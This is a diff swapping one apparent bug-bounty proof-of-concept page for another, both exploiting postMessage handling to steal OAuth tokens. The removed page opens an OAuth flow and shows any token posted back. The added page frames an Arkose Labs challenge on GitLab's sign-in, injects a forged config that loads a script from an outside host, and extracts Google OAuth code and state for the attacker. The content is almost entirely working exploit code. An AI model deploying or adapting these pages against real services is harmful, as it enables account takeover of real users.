@@ -1,26 +1,41 @@
-<!Doctype HTML>
-<html>
-    <head>
-        <title>PlayStation Authorization Token Leaks via postMessage</title>
-    </head>
-    <body>
-        <script type="text/javascript">
-        window.addEventListener("load", () => {
-            document.getElementById("startBtn").addEventListener("click", () => {
-                var x = window.open('https://www.upwork.com/ab/account-security/oauth2/authorize?client_id=fe2b7ccb32b6d0a9796dc103752b2499&redirect_uri=https%3A%2F%2Fzapier.com%2Fdashboard%2Fauth%2Foauth%2Freturn%2FUpworkCLIAPI%2F&response_type=token&state=1674910413.363254315059', 'mywindow');
-                window.onmessage = (e) => {
-                    document.getElementById("token-plate").innerText = JSON.stringify(e.data);
-                }
-            });
-        });
-        </script>
-        <h1>PlayStation Authorization Token Leaks via postMessage</h1>
-        <button id="startBtn" style='padding: 0.5em; font-size: 1.2em; width: 200px;'>Start</button>
-        <div id="token-plate" style="margin: 1em; padding: 1.2em; border: 1px solid #ddd;">
-            <em>Token Plate</em>
-        </div>
-        <footer>
-            @nnez | HackerOne
-        </footer>
-    </body>
-</html>
+<html>  
+<style>pre { word-break: break-word; white-space: pre-wrap; }</style>  
+<body>  
+<div id="start">  
+Attacker, enter your state when trying to sign in to Google here:<br />  
+<input id="state">  
+<button onclick="launch()">Generate a victim page with attacker's state</button>  
+</div>
+
+<div id="fr"></div>
+
+<script>  
+var inj;  
+function launch() {  
+    document.getElementById('fr').innerHTML = '<iframe id="b" name="b" src="https://gitlab-api.arkoselabs.com/v2/12D76D4C-5EDF-4EB4-A84D-042C497A9610/enforcement.1055143c784efaba2cba6d6738e34724.html?state=' + encodeURIComponent(document.getElementById('state').value) + '" frameborder=0 style="width: 500px; height: 300px"></iframe>';  
+    document.getElementById('start').innerHTML = '';  
+    injectiframe()  
+}
+window.onmessage = function(e) {  
+    if (e.data === 'stopinject') {  
+        console.log('frame injected');  
+        clearInterval(inj)  
+    }  
+    if (e.data.indexOf('id_token') !== -1) {  
+        payload = JSON.parse(e.data);  
+        code = payload.siteData.location.href.split('#')[1].split('&id_token')[0].replace('state%3D', '');  
+        document.getElementById('fr').innerHTML = 'We have the code + state from Google:<br /><pre>' + code + '</pre>';  
+    }  
+}
+function injectiframe() {  
+    inj = setInterval(function() {  
+        console.log('looking for frame...');  
+        b.postMessage('{"clientData":{},"selector":".js-arkose-labs-container-1","settings":{},"accessibilitySettings":{},"challengeApiUrl":"https://foo","challengeApiDomain":"https://foo","challengeLoaderUrl":"https://foo","mode":"inline","publicKey":"12D76D4C-5EDF-4EB4-A84D-042C497A9610","siteData":{"location":{"ancestorOrigins":{},"href":"https://gitlab.com/","origin":"https://gitlab.com","protocol":"https:","host":"gitlab.com","hostname":"gitlab.com","port":"","pathname":"/users/sign_in","search":"","hash":""}},"data":{"clientData":{},"selector":".js-arkose-labs-container-1","settings":{},"accessibilitySettings":{},"challengeApiUrl":"https://fransrosen.com/gitlab-hijack-frame-dsnion2doin2od.js?3","challengeApiDomain":"https://foo","challengeLoaderUrl":"https://gitlab-api.arkoselabs.com/fc/api/sri/","mode":"inline","publicKey":"12D76D4C-5EDF-4EB4-A84D-042C497A9610","siteData":{"location":{"ancestorOrigins":{},"href":"https://gitlab.com/","origin":"https://gitlab.com","protocol":"https:","host":"gitlab.com","hostname":"gitlab.com","port":"","pathname":"/users/sign_in","search":"","hash":""}}},"key":"12D76D4C-5EDF-4EB4-A84D-042C497A9610","message":"config","type":"emit"}', '*');  
+    }, 500);  
+}
+
+</script>
+
+
+</body>  
+</html>  
